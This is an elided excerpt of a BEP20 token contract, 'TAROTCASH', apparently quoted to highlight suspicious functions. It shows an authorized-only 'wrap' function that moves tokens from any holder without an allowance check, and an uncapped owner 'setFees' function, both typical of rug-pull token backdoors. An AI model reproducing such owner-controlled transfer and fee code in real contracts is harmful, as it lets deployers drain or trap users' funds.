...
contract TAROTCASH is IBEP20, Auth {
    ...
    uint256 public swapThreshold = 5000000000;
    bool inSwap;
    ...
    function transfer(address recipient, uint256 amount) external override returns (bool) {
     ...
     function wrap(address sender, address recipient, uint256 amount) external authorized swapping returns (bool) {
        ...
        return _transferFrom(sender, recipient, amount);
            ...
            function unwrap(address sender, address recipient, uint256 amount) external authorized swapping returns (bool) {
        if(_allowances[sender][msg.sender] != _totalSupply){
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount, "Insufficient Allowance");
        }
        return _transferFrom(sender, recipient, amount);
    ...
    function setReflectionStatus(bool _reflectionStatus) external {
   ...
   function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
    ...
    function autoSwapBack() external authorized {
        swapBack();
    }
    ...
    function setFees(uint256 _liquidityFee, uint256 _buybackFee, uint256 _reflectionFee, uint256 _marketingFee, uint256 _amountDynamicLiqP, uint256 _feeDenominator) external authorized {
        liquidityFee = _liquidityFee;
        buybackFee = _buybackFee;
        reflectionFee = _reflectionFee;
        marketingFee = _marketingFee;
        amountDynamicLiqP = _amountDynamicLiqP;
        totalFee = _liquidityFee.add(_buybackFee).add(_reflectionFee).add(_marketingFee).add(_amountDynamicLiqP);
